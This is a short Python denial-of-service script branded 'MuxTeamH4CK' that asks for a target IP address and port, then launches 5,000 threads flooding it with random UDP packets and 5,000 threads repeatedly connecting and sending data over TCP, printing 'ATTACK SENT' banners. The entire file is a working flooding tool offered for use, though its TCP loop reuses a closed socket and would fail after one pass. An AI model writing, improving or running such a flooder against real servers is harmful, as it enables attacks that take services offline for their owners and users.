import time
import os
import socket
import threading

def udpflood(ip, port):
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  raw = os.urandom(1200)
  payload = b'\xfe' + raw
  while True:
    s.sendto(payload, (ip, port))

def tcpflood(ip, port):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  raw = os.urandom(1200)
  while True:
    s.connect((ip, port))
    s.send(raw)
    time.sleep(0)
    s.close()
os.system("clear")
os.system("pyfiglet --color=RED MuxTeamH4CK")
print("\033[1;34m")
print("Teams: EnderBob x ItzMuxGamer")
print(" ")
time.sleep(0)
ip = input("IP Address: ")
port = int(input("Port Address: "))
time.sleep(0)
os.system("clear")
os.system("pyfiglet --color=RED MuxTeamH4CK")
print(" ")
print("Successfully ATTACK SENT TO SERVER!")
print(" ")
print("\033[33m=====================")
print(" ")
print(f"\033[31mIP Address: {ip}")
print(f"\033[31mPort Address: {port}")
print("Stopped Attack: CTRL + Z")
print(" ")
print("\033[33m=====================")

for i in range(5000):
  t = threading.Thread(target=udpflood,args=(ip, port), daemon=True)
  t.start()
for i in range(5000):
  t2 = threading.Thread(target=tcpflood,args=(ip, port), daemon=True)
  t2.start()

while True:
  time.sleep(0)
